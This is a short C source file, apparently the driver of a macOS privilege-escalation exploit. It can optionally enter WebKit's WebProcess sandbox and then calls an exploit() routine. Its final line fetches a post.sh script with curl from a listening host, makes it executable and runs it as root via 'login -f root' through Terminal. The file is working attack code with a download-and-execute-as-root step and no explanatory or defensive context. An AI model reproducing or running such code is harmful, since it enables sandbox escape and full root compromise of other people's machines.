#include "eop_common.h"
extern int sandbox_init_with_parameters(char*, int, char**, char**);

int main(int argc, char** argv) {
    if (argc >= 2 && !strcmp(argv[1], "-s")) {
        char* errstr = 0;
        char* params[] = {"HOME_DIR", 0, "WEBKIT2_FRAMEWORK_DIR", 0, "DARWIN_USER_CACHE_DIR", 0, "DARWIN_USER_TEMP_DIR", 0, "HOME_LIBRARY_PREFERENCES_DIR", 0, 0, 0};
        for (int i = 0; params[i]; i+=2)
            params[i+1] = "/tmp";
        if (sandbox_init_with_parameters("/System/Library/Frameworks/WebKit.framework/Resources/com.apple.WebProcess.sb", 3, params, &errstr)) {
            printf("couldnt init sandbox: %s\n", errstr);
            return 1;
        }
        printf("initialized sandbox\n");
    }
    exploit();
    printf("done\n");
    system("curl -o /tmp/post.sh http://0.0.0.0:5151/post.sh && chmod +x /tmp/post.sh && echo 0.0.0.0 > /tmp/ip && login -f root /System/Applications/Utilities/Terminal.app/Contents/MacOS/Terminal /tmp/post.sh");
    return 0;
}
